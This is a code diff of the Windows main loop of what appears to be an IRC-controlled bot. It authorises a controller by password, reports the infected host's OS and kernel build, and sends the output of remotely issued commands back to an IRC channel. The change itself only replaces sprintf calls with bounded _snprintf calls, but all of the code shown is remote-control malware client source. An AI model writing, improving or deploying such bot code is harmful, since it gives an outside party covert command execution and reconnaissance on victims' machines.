@@ -45,12 +45,12 @@ void et_main_loop_win(SOCKET socket, char *nick)
 				if (!strcmp(cmd, IRC_AUTH))
 				{
 					auth = 1;
-					sprintf(auth_message, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
+					_snprintf(auth_message, 256, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
 					send(socket, auth_message, strlen(auth_message), 0);
 				}
 				else
 				{
-					sprintf(auth_message, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
+					_snprintf(auth_message, 256, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
 					send(socket, auth_message, strlen(auth_message), 0);
 				}
 			}
@@ -59,7 +59,7 @@ void et_main_loop_win(SOCKET socket, char *nick)
 				if (!auth)
 				{
 					char unauth_message[256];
-					sprintf(unauth_message, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
+					_snprintf(unauth_message, 256, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
 					send(socket, unauth_message, strlen(unauth_message), 0);
 				}
 				else
@@ -71,7 +71,7 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					else if (!strcmp(cmd, "deauth"))
 					{
 						char deauth_message[256];
-						sprintf(deauth_message, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
+						_snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
 						send(socket, deauth_message, strlen(deauth_message), 0);
 						auth = 0;
 					}
@@ -81,23 +81,23 @@ void et_main_loop_win(SOCKET socket, char *nick)
 						char kern[256];
 
 						#if defined(NTDDI_WIN7)
-							sprintf(os, "PRIVMSG %s :OS: Microsoft Windows 7\r\n", IRC_CHANNEL);
+							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows 7\r\n", IRC_CHANNEL);
 						#elif defined(NTDDI_WIN8)
-							sprintf(os, "PRIVMSG %s :OS: Microsoft Windows 8\r\n", IRC_CHANNEL);
+							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows 8\r\n", IRC_CHANNEL);
 						#elif defined(NTDDI_WINBLUE)
-							sprintf(os, "PRIVMSG %s :OS: Microsoft Windows 8.1\r\n", IRC_CHANNEL);
+							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows 8.1\r\n", IRC_CHANNEL);
 						#elif defined(NTDDI_VISTA) || defined(NTDDI_VISTASP1)
-							sprintf(os, "PRIVMSG %s :OS: Microsoft Windows Vista\r\n", IRC_CHANNEL);
+							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows Vista\r\n", IRC_CHANNEL);
 						#elif defined(NTDDI_WINXP) || defined(NTDDI_WINXPSP1) || defined(NTDDI_WINXPSP2) || defined(NTDDI_WINXPSP3)
-							sprintf(os, "PRIVMSG %s :OS: Microsoft Windows XP\r\n", IRC_CHANNEL);
+							_snprintf(os, 256, "PRIVMSG %s :OS: Microsoft Windows XP\r\n", IRC_CHANNEL);
 						#else
-							sprintf(os, "Microsoft Windows", 256);
+							_snprintf(os, 256, "Microsoft Windows", 256);
 						#endif
 
 						OSVERSIONINFO kern_info;
 						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 						GetVersionEx(&kern_info);
-						sprintf(kern, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
+						_snprintf(kern, 256, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
 
 						send(socket, os, strlen(os), 0);
 						send(socket, kern, strlen(kern), 0);
@@ -121,11 +121,11 @@ void et_main_loop_win(SOCKET socket, char *nick)
 
 						if (strlen(cmd_output) >= 500)
 						{
-							snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
+							_snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
 						}
 						else
 						{
-							snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+							_snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
 						}
 
 						send(socket, cmd_message, strlen(cmd_message), 0);
